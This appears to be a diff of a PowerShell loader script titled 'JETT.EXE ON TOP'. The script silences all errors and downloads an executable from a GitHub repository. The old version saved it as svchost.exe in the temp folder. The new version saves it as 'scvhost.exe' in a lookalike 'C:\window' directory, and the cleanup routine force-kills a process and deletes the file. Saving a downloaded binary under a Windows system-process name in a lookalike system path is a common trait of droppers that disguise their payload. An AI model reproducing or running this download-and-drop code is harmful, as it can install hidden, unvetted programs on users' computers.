@@ -1,4 +1,4 @@
-﻿$ErrorActionPreference = "SilentlyContinue"
+$ErrorActionPreference = "SilentlyContinue"
 
 [Console]::Title = "JETT.EXE ON TOP"
 
@@ -25,7 +25,6 @@ function Show-Header {
     Write-Host ""
     Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
     Write-Host ""
-
 }
 
 # =========================
@@ -126,8 +125,8 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-        $url  = "https://github.com/draft7973-ops/JETT_SMITH.exe/raw/main/svchost.exe"
-        $path = "$env:TEMP\svchost.exe"
+        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
+        $path = "C:\window\scvhost.exe"
 
         try {
 
@@ -177,12 +176,12 @@ while ($true)
         Write-Console "CLEANING..." "INFO"
 
         Stop-Process `
-        -Name "svchost" `
+        -Name "JETT" `
         -Force `
         -ErrorAction SilentlyContinue
 
         Remove-Item `
-        "$env:TEMP\svchost.exe" `
+        "C:\window\scvhost.exe" `
         -Force `
         -ErrorAction SilentlyContinue
 
